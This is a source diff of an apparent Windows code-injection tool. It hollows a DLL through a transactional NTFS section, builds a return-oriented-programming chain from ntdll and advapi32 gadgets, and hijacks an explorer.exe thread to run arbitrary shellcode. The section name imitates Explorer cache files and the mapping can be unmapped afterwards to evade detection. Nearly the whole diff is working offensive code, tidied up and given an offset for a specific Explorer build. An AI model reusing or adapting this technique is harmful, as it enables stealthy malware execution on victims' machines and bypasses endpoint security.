@@ -15,6 +15,7 @@
 #include <processthreadsapi.h>
 #include <algorithm>
 #include "helper.h"
+#include "buildrop.h"
 extern "C" {
 #include "memmem.h"
 }
@@ -249,26 +250,13 @@ bool HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 									RtlInitUnicodeString2(&szName, L"\\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db");
 
 									InitializeObjectAttributes(&LocalAttributes, &szName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-									//if (vvp_to_rx) {
-									//	NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); // THIS IS GOOD ONE
-									//}
-									//else {
-									//	NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, nullptr, PAGE_EXECUTE_READWRITE, SEC_IMAGE, hFile); // THIS IS GOOD ONE
-									//}
-									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); // THIS IS GOOD ONE
+									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);
 
 									if (NT_SUCCESS(NtStatus)) {
 
-										//HANDLE h2Section = nullptr;;
-										//h2Section = OpenFileMappingA(SECTION_MAP_READ, TRUE, "My");
-
-										* pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
+										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
 										NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
 										SIZE_T viewSize = *pqwMapBufSize;
-										//if (rrpid != 0) {
-										//	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, rrpid);
-										//	NtStatus = NtMapViewOfSection(hSection, procHandle, (void**)pprMapBuf, 0, 0, nullptr, &viewSize, 1, 0, PAGE_EXECUTE_READ);
-										//}
 
 										PVOID sectionTarget = NULL;
 
@@ -282,22 +270,10 @@ bool HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 													if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
 														memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);
 
-														////this actually isn't even necessary since we're exiting the injector and its mapping anyway
 														if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
 															bMapped = true;
 														}
 
-														//if (vvp_to_rx) {
-														//	if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
-														//		bMapped = true;
-														//	}
-														//}
-														//else {
-														//	if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect)) {
-														//		bMapped = true;
-														//	}
-														//}
-														
 													}
 												}
 												else {
@@ -332,9 +308,6 @@ bool HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 						CloseHandle(hTransaction);
 					}
 				}
-				//else {
-					//printf("- Failed to open handle to %ws (error %d)\r\n", FilePath, GetLastError());
-				//}
 			}
 		} while (!bMapped && FindNextFileW(hFind, &Wfd));
 
@@ -351,7 +324,7 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 	DWORD64 rop_pos = 0;
 	DWORD64* ROP_chain;
 	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
-	
+
 	HMODULE ntdll = GetModuleHandleA("ntdll");
 	TEXT_SECTION_INFO ntdll_info = GetTextSection(ntdll);
 
@@ -377,7 +350,7 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 	DWORD64 GADGET_popR8 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x58\xc3", 3); // pop r8 ; ret;
 	DWORD64 GADGET_POP_R9_R10_r11 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x59\x41\x5a\x41\x5b\xc3", 7); //0x000000018008fb34 : pop r9 ; pop r10 ; pop r11 ; ret // 4159415a415bc3
 	DWORD64 GADGET_popR14 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x41\x5E\xC3", 3);
-	
+
 	DWORD64 GADGET_RAXtoRCX = (DWORD64)memmem((BYTE*)advapi_info.address, advapi_info.size, "\x48\x8b\xc8\x48\x8b\xc1\x48\x83\xc4\x28\xc3", 11); //0x000000018001852a : mov rcx, rax ; mov rax, rcx ; add rsp, 0x28 ; ret // 488bc8488bc14883c428c3
 	DWORD64 GADGET_RAXtoRBX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x50\x5b\xc3", 3); //0x00000001800011a3 : push rax ; pop rbx ; ret // 505bc3
 	DWORD64 GADGET_RAXtoR9 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4C\x8B\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11); //mov r9, rax; mov rax, r9; add rsp, 0x28; ret;
@@ -477,7 +450,7 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
 	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
 	ROP_chain[rop_pos++] = map_size; //  
-	
+
 
 	// if it is image backed, we need to move the pointer forward by 0x1000 to the .text RX region
 	if (is_image_backed) {
@@ -582,7 +555,7 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 	}
 	if (unmap_option) {
 		// UNMAP VIEW of the section now
-		// First we need to sleep (10 seconds = 0x2710) while the Donut shellcode executes
+		// First we need to sleep (10 seconds = 0x2710) while the shellcode executes
 		ROP_chain[rop_pos++] = GADGET_popRCX;
 		ROP_chain[rop_pos++] = 0x2710;
 		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "Sleep");
@@ -652,12 +625,11 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 	ROP_chain[rop_pos++] = GADGET_pivot;
 	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
 
-	// holds the string "advapi32" and ".dll\0"
+	//copy advapi32.dll and msvcp_win.dll into the proper positions in chain
 	ROP_chain[advapi_string] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
 	strcpy((char*)&ROP_chain[rop_pos++], "advapi32");
 	strcpy((char*)&ROP_chain[rop_pos++], ".dll\0");
 
-	// holds the string "advapi32" and ".dll\0"
 	ROP_chain[msvcp_win_string] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
 	strcpy((char*)&ROP_chain[rop_pos++], "msvcp_wi");
 	strcpy((char*)&ROP_chain[rop_pos++], "n.dll\0");
@@ -681,7 +653,6 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 	strcpy((char*)&ROP_chain[rop_pos++], "0001.db\0");
 
 
-
 	ROP_chain[rop_pos++] = DONT_CARE;
 
 	ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
@@ -701,7 +672,7 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 
 
 int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
-	
+
 	std::vector<std::wstring> Args(&pArgv[0], &pArgv[0 + nArgc]);
 	HMODULE	hSelfModule = GetModuleHandleA(nullptr);
 
@@ -809,7 +780,6 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 		printf("RWX memory will be VirtualProtected to RX - note that dynamically self-decrypting payloads cannot be executed from RX memory");
 	}
 
-	// setting it here so that the vp_to_rx message does not get printed for txf hollowing
 	if (alloc_type == 1) {
 		vp_to_rx = true;
 	}
@@ -818,11 +788,11 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 		printf("Must specify a payload path\r\n");
 		return 0;
 	}
-	
+
 
 	bool is_image_backed = false;
 
-	
+
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 	uint32_t dwFileSize = 0;
 	uint8_t* pFileBuf = nullptr;
@@ -856,7 +826,6 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 			printf("Locating suitable image for txf-dll-map-hollow...\r\n");
 		}
 		HollowDLL(&pMapBuf, &qwMapBufSize, (uint8_t*)pFileBuf, dwFileSize, &pMappedCode, &prMapBuf, &prMappedCode, 0, bTxF, vp_to_rx);
-		//((fnAddr)pMappedCode)();
 		is_image_backed = true;
 	}
 	else {
@@ -869,13 +838,12 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 		OBJECT_ATTRIBUTES LocalAttributes;
 		UNICODE_STRING szName;
 		RtlInitUnicodeString2 = (MyRtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll"), "RtlInitUnicodeString");
-		
+
 		// Section name: "C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db" (name similar to sections commonly loaded by Explorer)
 		RtlInitUnicodeString2(&szName, L"\\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db");
 		InitializeObjectAttributes(&LocalAttributes, &szName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-		NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, &max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr); // THIS IS GOOD ONE
+		NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, &max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
 
-		//NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr); // THIS IS GOOD ONE
 		qwMapBufSize = 0;
 		NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)&pMapBuf, 0, 0, nullptr, (PSIZE_T)&qwMapBufSize, 1, 0, PAGE_EXECUTE_READWRITE);
 		uint32_t dwOldProtect = 0;
@@ -918,7 +886,7 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 				{
 					// Check if it matches explorer
 					if (_tcscmp(szModName, explorerStr) != 0) {
-						target_thread_addr = (DWORD64)(hMods[i]) + 555264; //Explorer.exe+0x87900
+						target_thread_addr = (DWORD64)(hMods[i]) + 569616; //Explorer.exe+0x8b110 (KB4586781)
 						break;
 					}
 					//printf("%s (0x%08X)\n", szModName, hMods[i]);
@@ -933,7 +901,6 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 			DWORD64 thread_start = NULL;
 			DWORD return_length = 0;
 			NTSTATUS NtStatus;
-			//NtQueryInformationThread = (NTSTATUS(NTAPI*)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread");
 			NTQUERYINFORMATIONTHREAD NtQueryInformationThread = NULL;
 			NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll, "NtQueryInformationThread");
 			NtStatus = NtQueryInformationThread(tt, 9, &thread_start, sizeof(thread_start), &return_length);
@@ -963,7 +930,6 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 	runtime_parameters["tos"] = runtime_parameters["orig_tos"] - 0x2000;
 
 	HMODULE ntdll = GetModuleHandleA("ntdll");
-	//HANDLE t = target->thread;
 	PINJECTRA_PACKET* payload_output;
 
 	// Evaluate Payload
